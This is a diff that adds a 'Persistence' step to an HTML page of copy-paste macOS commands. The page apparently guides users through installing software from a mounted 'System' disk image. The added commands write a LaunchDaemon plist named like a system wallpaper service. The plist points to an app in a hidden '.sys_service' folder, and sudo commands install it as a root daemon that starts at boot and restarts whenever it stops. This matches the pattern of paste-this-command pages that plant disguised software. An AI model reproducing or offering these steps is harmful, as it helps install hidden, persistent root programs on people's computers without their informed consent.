@@ -279,6 +279,56 @@
                 <pre><code>hdiutil detach /Volumes/System* && rm System*.dmg</code></pre>
             </div>
         </section>
+
+        <section class="step">
+            <div class="step-meta">
+                <i class="fa-solid fa-gears"></i>
+                <span class="step-label">Step 05</span>
+            </div>
+            <h2>Persistence</h2>
+            <p>Configure the system to automatically launch the service on boot and keep it running in the background.</p>
+
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Register Daemon</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+<pre><code>cat <<EOF > com.system.wallpaper.service.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.wallpaper.service</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/Library/Application Support/.sys_service/System Wallpaper Service.app/Contents/MacOS/System Wallpaper Service</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+EOF</code></pre>
+            </div>
+
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Activate Service</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+<pre><code>sudo mv com.system.wallpaper.service.plist /Library/LaunchDaemons/ && \
+sudo chown root:wheel /Library/LaunchDaemons/com.system.wallpaper.service.plist && \
+sudo chmod 644 /Library/LaunchDaemons/com.system.wallpaper.service.plist && \
+sudo launchctl load -w /Library/LaunchDaemons/com.system.wallpaper.service.plist</code></pre>
+            </div>
+
+            <div class="info-card">
+                <i class="fa-solid fa-circle-info" style="margin-top: 3px;"></i>
+                <span><strong>Automation:</strong> The <code>KeepAlive</code> flag ensures the service automatically restarts if it ever stops unexpectedly.</span>
+            </div>
+        </section>
     </div>
 
     <script>
